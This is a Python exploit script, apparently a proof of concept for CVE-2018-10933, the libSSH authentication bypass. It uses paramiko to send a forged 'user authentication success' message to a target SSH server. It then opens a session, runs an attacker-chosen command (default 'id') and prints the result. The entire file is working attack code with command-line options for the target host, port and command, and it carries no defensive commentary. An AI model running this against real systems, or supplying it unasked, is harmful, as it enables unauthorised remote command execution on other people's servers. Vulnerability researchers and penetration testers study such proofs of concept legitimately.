import paramiko
import argparse
import socket
from sys import exit

parser = argparse.ArgumentParser(description="CVE 2018-10933 | LibSSH Authentication Bypass")
parser.add_argument('--host', help='Host')
parser.add_argument('-p', '--port', help='libSSH port', default=22)
parser.add_argument('-c', '--command', help='Command to execute', default='id')
parser.add_argument('-log', '--logfile', help='Logfile', default="cve-2018-10933.log")
args = parser.parse_args()

def BypassAuthLibSSH(hostname, port, command):
    
    sock = socket.socket()
    try:
        sock.connect((str(hostname), int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
  
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
    
        remote_shell = transport.open_session(timeout=10)
        remote_shell.exec_command(command)
        
        stdout = remote_shell.makefile("rb", 2048)
        output = stdout.read()
        
        print(output)
        return 0
    
    except paramiko.SSHException as e:
        print(e)
        return 1
    except socket.error:
        print("Can not connect to the host")
        return 1

def main():
    paramiko.util.log_to_file(args.logfile)
    try:
        hostname = args.host
        port = args.port
        command = args.command
    except:
        parser.print_help()
        exit(1)
    BypassAuthLibSSH(hostname, port, command)

if __name__ == '__main__':
    exit(main())